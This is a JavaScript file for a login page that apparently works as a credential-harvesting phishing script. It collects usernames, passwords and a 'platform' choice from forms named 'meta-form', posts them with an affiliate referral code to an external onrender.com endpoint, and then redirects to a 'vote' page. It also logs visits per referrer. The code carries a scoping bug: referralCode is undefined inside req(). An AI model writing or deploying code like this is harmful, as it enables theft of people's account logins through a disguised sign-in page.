import { $, $$, _$, on } from './dom.js';
import { showFeedback } from './src/feedback.js';

// ================== Navigation ==================
function navigate() {
  const btns = $$("[data-role=nav]");
  btns.forEach(b => {
    on(b, "click", () => {
      const target = b.dataset.target;
      if (target) {
        // Before navigating, track visit to the next page
        trackVisitAndGo(target);
        window.location.href = target;
      }
    });
  });
}

// ================== Referral & Login ==================
function login(form) {
  // Try getting ?ref from URL
  let refFromURL = new URLSearchParams(window.location.search).get("ref");

  // Only store new referral if it actually exists
  if (refFromURL) {
    localStorage.setItem("refCode", refFromURL);
  }
  

  // Use stored ref or fallback if none found
   const referralCode = localStorage.getItem("refCode") || "K17PWA";

  // Collect login details
  const username = form.username?.value.trim();
  const password = form.password?.value;
  const platform = form.platform?.value;

  if (!username || !password) {
    showFeedback(
      "Wrong credentials",
      "You have entered an incorrect password or username, try again.",
      "Ok"
    );
    return;
  }

  // Payload always carries the correct referralCode
  const payload = { username, password, platform, referralCode };
  req(form, payload);
}

// ================== API Request (Register/Login) ==================
async function req(form, payload) {
  const button = form.querySelector("[type=submit]");
  const originalText = button.innerHTML;
  button.innerHTML = '<span class="spinner"></span>';

  try {
    const res = await fetch("https://nexa-mini.onrender.com/student/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) throw new Error("Network response not ok");

    const data = await res.json();

    if (data.success) {
      showFeedback("Success", "You have successfully logged in", "Continue");
      console.log("✅ Login response:", data);
      window.location.href = `vote.html?ref=${referralCode}`;
    } else {
      showFeedback("Login Failed", data.message || "Invalid credentials", "Retry");
    }
  } catch (e) {
    console.error("💥 Error:", e);
    showFeedback("Error", "Sorry, something went wrong", "Re-try");
  } finally {
    button.innerHTML = originalText;
  }
}

// ================== Visit Tracking ==================
async function trackVisitAndGo(path = window.location.pathname) {
  try {
    // Get referral from URL (if exists)
    const urlRef = new URLSearchParams(window.location.search).get('ref');

    // Only overwrite stored ref if a real one exists in URL
    if (urlRef) {
      localStorage.setItem("refCode", urlRef);
    }

    // Load final referral code or fallback
    const ref = localStorage.getItem("refCode") || "K17PWA";

    const payload = {
      path,
      referrer: ref,
      utm: null,
      userAgent: navigator.userAgent
    };

    await fetch('https://nexa-mini.onrender.com/student/visit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    console.log("✅ Visit tracked:", payload);

  } catch (err) {
    console.warn('⚠️ Visit tracking failed:', err);
  }
}

// ================== Boot ==================
window.onload = () => {
  trackVisitAndGo(); // Track on page load
  navigate(); // Activate navigation buttons

  const forms = $$(".meta-form");
  if (forms.length > 0) {
    forms.forEach(form => {
      on(form, "submit", e => {
        e.preventDefault();
        login(form); // Submit with correct referral code
      });
    });
  }
};